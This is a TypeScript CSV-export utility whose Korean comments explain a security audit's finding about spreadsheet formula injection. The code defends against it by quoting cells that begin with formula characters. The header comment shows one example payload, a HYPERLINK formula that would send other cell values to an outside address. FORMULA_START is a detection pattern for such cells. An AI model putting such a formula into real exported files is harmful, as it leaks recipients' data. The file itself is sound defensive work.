/*
  CSV 만들기 — 내보내는 곳이 전부 여기를 지난다.

  왜 한 곳으로 모았나 (2026-09-08 보안 감사): 저장소에 CSV 를 만드는 곳이 둘인데
  **한쪽에만 수식 인젝션 방어가 있었다.**
   · 프로필 링크 «받은 내용» CSV — 방어 있음(방문자 입력이라 처음부터 조심했다)
   · 성과 리포트 CSV — 방어 없음. 그런데 이쪽이 **광고주·클라이언트에게 건네는 문서**다.
  리포트에는 인스타 캡션이 그대로 들어간다. 캡션 첫 줄을 `=HYPERLINK("https://…"&A2,"성과 보기")`
  로 시작하게 올려 두면, 그 파일을 받은 사람의 엑셀에서 수식이 **실행**된다 —
  시트의 다른 칸 값이 외부 주소로 실려 나가고, 「외부 데이터 연결」 보안 경고가 뜬다.
  대행사가 보낸 리포트가 «바이러스 같은 파일»로 읽히는 것이 실제 피해다.

  ⚠️ CSV 인용(`"…"`)은 방어가 아니다. 엑셀은 인용을 벗긴 뒤 `=` 로 시작하는 셀을 수식으로 평가한다.
  작은따옴표를 앞에 붙여 문자열로 고정해야 한다(OWASP CSV Injection).

  의존이 없다 — 클라이언트 컴포넌트(프로필 링크 편집기)와 서버 라우트(리포트 다운로드)가 함께 읽는다.
  **여기에 server-only 를 붙이거나 서버 모듈을 import 하지 말 것** — 편집기 빌드가 깨진다.
*/

/** 엑셀이 수식으로 읽기 시작하는 문자들. 탭·CR 은 앞 칸을 밀어내는 데 쓰인다. */
const FORMULA_START = /^[=+\-@\t\r]/;
/** 순수한 숫자는 예외 — 접두사를 붙이면 지표가 텍스트가 돼 합계·차트가 안 잡힌다 */
const PLAIN_NUMBER = /^[+-]?\d+(\.\d+)?$/;

/**
 * 한국 엑셀이 UTF-8 로 읽게 하는 BOM.
 * ⚠️ 없으면 CP949 로 읽어 한글이 통째로 깨진다. 소스에 U+FEFF 를 문자 그대로 박아 두면
 * 편집 중에 조용히 사라져도 아무도 못 보므로 상수로 둔다.
 */
export const CSV_BOM = "﻿";

/** 한 칸 — 수식 인젝션 방어 + 따옴표·줄바꿈 이스케이프 */
export function csvCell(v: string | number | null | undefined): string {
  if (typeof v === "number") return Number.isFinite(v) ? String(v) : "";
  let t = v == null ? "" : String(v);
  if (FORMULA_START.test(t) && !PLAIN_NUMBER.test(t)) t = `'${t}`;
  /* \r 도 인용 대상이다 — 행 구분이 \r\n 인데 검사에서 \r 이 빠져 있으면,
     윈도우에서 복사한 CRLF 캡션 하나가 표를 한 줄 어긋나게 만든다(공격 없이도 난다). */
  return /[",\n\r]/.test(t) ? `"${t.replaceAll('"', '""')}"` : t;
}

/** 여러 행 → CSV 본문(BOM 제외). 행 구분은 \r\n — 엑셀이 기대하는 형태다. */
export function csvRows(lines: Array<Array<string | number | null | undefined>>): string {
  return lines.map((l) => l.map(csvCell).join(",")).join("\r\n");
}

/** BOM 까지 붙인 완성본 */
export function csvDocument(lines: Array<Array<string | number | null | undefined>>): string {
  return CSV_BOM + csvRows(lines);
}
